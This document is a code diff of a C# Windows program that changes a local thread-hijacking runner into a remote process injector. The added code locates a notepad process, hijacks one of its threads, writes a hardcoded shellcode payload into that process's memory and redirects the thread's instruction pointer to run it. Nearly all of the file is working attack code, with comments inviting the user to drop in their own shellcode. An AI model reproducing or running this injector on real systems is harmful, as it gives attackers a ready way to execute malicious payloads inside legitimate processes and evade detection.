@@ -1,25 +1,47 @@
-﻿
+﻿using System.Diagnostics;
 using System.Runtime.Remoting.Contexts;
 using System;
 using System.Runtime.InteropServices;
-using System.Threading;
 
-namespace Thread_Hijacking_Runner
+namespace Thread_Hijacking_Injector
 {
     internal class Program
     {
         [DllImport("kernel32.dll")]
-        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, UInt32 dwThreadId);
 
-        public enum ThreadCreationFlags : UInt32
+        [Flags]
+        public enum ThreadAccess : UInt32
         {
-            NORMAL = 0x0,
-            CREATE_SUSPENDED = 0x00000004,
-            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
+            TERMINATE = 0x0001,
+            SUSPEND_RESUME = 0x0002,
+            GET_CONTEXT = 0x0008,
+            SET_CONTEXT = 0x0010,
+            SET_INFORMATION = 0x0020,
+            QUERY_INFORMATION = 0x0040,
+            SET_THREAD_TOKEN = 0x0080,
+            IMPERSONATE = 0x0100,
+            DIRECT_IMPERSONATION = 0x0200,
+            THREAD_ALL_ACCESS = 0x1fffff
         }
 
-        [DllImport("kernel32.dll")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+        [Flags]
+        public enum AllocationType
+        {
+            NULL = 0x0,
+            Commit = 0x1000,
+            Reserve = 0x2000,
+            Decommit = 0x4000,
+            Release = 0x8000,
+            Reset = 0x80000,
+            Physical = 0x400000,
+            TopDown = 0x100000,
+            WriteWatch = 0x200000,
+            LargePages = 0x20000000
+        }
 
         [Flags]
         public enum MemoryProtection : UInt32
@@ -37,6 +59,13 @@ namespace Thread_Hijacking_Runner
             PAGE_WRITECOMBINE = 0x00000400
         }
 
+        [DllImport("kernel32.dll")]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint SuspendThread(IntPtr hThread);
+
+        [StructLayout(LayoutKind.Sequential, Pack = 16)]
         public struct CONTEXT64
         {
             public ulong P1Home;
@@ -134,20 +163,6 @@ namespace Thread_Hijacking_Runner
             }
         }
 
-        public enum CONTEXT_FLAGS : uint
-        {
-            CONTEXT_i386 = 0x10000,
-            CONTEXT_i486 = 0x10000,   //  same as i386
-            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
-            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
-            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
-            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
-            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
-            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
-            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
-            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
-        }
-
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
 
@@ -159,9 +174,24 @@ namespace Thread_Hijacking_Runner
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern uint ResumeThread(IntPtr hThread);
+
+        internal static ProcessThread GetThread(ProcessThreadCollection threads)
+        {
+            // find a thread
+            // it is very likely that the process you are hijacking will be unstable as 0 is probably the main thread
+            return threads[0];
+
+            /*
+            // you could loop through the threads looking for a better one
+            foreach(ProcessThread thread in threads)
+            {
+
+            }
+            */
+        }
         static void Main(string[] args)
         {
-            // place your shellcode here
+            // put your shellcode here
             byte[] shellcode = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
 0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
 0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
@@ -207,55 +237,59 @@ namespace Thread_Hijacking_Runner
 0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
 };
 
-            IntPtr hThread = CreateThread(IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, (uint)ThreadCreationFlags.CREATE_SUSPENDED, out hThread);
-            Console.WriteLine("[+] CreateThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
+            Process[] processes = Process.GetProcessesByName("notepad");
 
-            unsafe
+            if (processes.Length == 0)
             {
-                fixed (byte* ptr = shellcode)
-                {
-                    // set the memory where the shellcode is to PAGE_EXECUTE_READWRITE
-                    IntPtr memoryAddress = (IntPtr)ptr;
-                    if(!VirtualProtect(memoryAddress, (UIntPtr)shellcode.Length, MemoryProtection.PAGE_EXECUTE_READWRITE, out MemoryProtection lpfOldProtect))
-                    {
-                        Console.WriteLine("[!] Error, VirtualProtect can't rewrite memory access");
-                        return;
-                    }
-                    
-                    Console.WriteLine("[+] VirtualProtect() - set to PAGE_EXECUTE_READWRITE, shellcode address: 0x{0}", new string[] { memoryAddress.ToString("X") });
-
-                    //CONTEXT_ALL = 0x10001F
-                    CONTEXT64 ctx = new CONTEXT64();
-                    ctx.ContextFlags = (uint)CONTEXT_FLAGS.CONTEXT_ALL;
-
-                    // get the thread context - we are looking to manipulate the instruction pointer register
-                    
-                    Console.WriteLine("[+] GetThreadContext() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
-                    
-                    if (!GetThreadContext(hThread, ref ctx))
-                    {
-                        Console.WriteLine("[!] Error: {0}", GetLastError());
-                        return;
-                    }
-                    
-                    Console.WriteLine("[+] RIP is: 0x{0}", new string[] { ctx.Rip.ToString("X") });
-
-                    // point the instruction pointer to our shellcode
-                    ctx.Rip = (ulong)memoryAddress;
-
-                    // set the thread context (update the registers)
-                    
-                    Console.WriteLine("[+] SetThreadContext(), RIP assigned: 0x{0}", new string[] { memoryAddress.ToString("X") });
-                    
-                    SetThreadContext(hThread, ref ctx);
-                }
+                Console.WriteLine("[!] Unable to find process to inject into!");
+                return;
             }
 
+            Console.WriteLine("[+] Found process: {0}", new string[] { processes[0].Id.ToString() });
+            Process target = processes[0];
+
+            ProcessThread thread = GetThread(target.Threads);
+            Console.WriteLine("[+] Found thread: {0}", new string[] { thread.Id.ToString() });
+
+            // get a handle to the thread
+            IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
+            Console.WriteLine("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
+
+            // allocate some memory for our shellcode
+            IntPtr pAddr = VirtualAllocEx(target.Handle, IntPtr.Zero, (UInt32)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.PAGE_EXECUTE_READWRITE);
+            Console.WriteLine("[+] VirtualAllocEx(), assigned: 0x{0}", new string[] { pAddr.ToString("X") });
+
+            // write the shellcode into the allocated memory
+            Console.WriteLine("[+] WriteProcessMemory() - remote address: 0x{0}", new string[] { pAddr.ToString("X") });
+            WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);
+
+            Console.WriteLine("[+] SuspendThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
+            SuspendThread(hThread);
+
+            //CONTEXT_ALL = 0x10001F
+            CONTEXT64 ctx = new CONTEXT64();
+            ctx.ContextFlags = 0x10001F;
+
+            // get the thread context - we are looking to manipulate the instruction pointer register
+            Console.WriteLine("[+] GetThreadContext() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
+            if (!GetThreadContext(hThread, ref ctx))
+            {
+                Console.WriteLine("[!] Error: {0}", GetLastError());
+                return;
+            }
+
+            Console.WriteLine("[+] RIP is: 0x{0}", new string[] { ctx.Rip.ToString("X") });
+
+            // point the instruction pointer to our shellcode
+            ctx.Rip = (ulong)pAddr;
+
+            // set the thread context (update the registers)
+            Console.WriteLine("[+] SetThreadContext(), RIP assigned: 0x{0}", new string[] { pAddr.ToString("X") });
+            SetThreadContext(hThread, ref ctx);
+
             Console.WriteLine("[+] ResumeThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
-            
             ResumeThread(hThread);
-            Thread.Sleep(10000);
-            // Console.ReadKey();
+            Console.ReadKey();
         }
     }
 }
